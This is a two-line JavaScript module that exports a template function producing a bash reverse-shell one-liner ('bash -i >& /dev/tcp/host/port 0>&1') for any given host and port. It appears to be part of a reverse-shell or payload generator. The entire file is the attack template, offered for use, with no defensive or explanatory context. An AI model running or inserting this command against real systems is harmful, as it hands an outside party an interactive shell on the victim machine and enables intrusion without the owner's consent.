const templates={bash:(host,port)=>`bash -i >& /dev/tcp/${host}/${port} 0>&1`};
module.exports={templates};
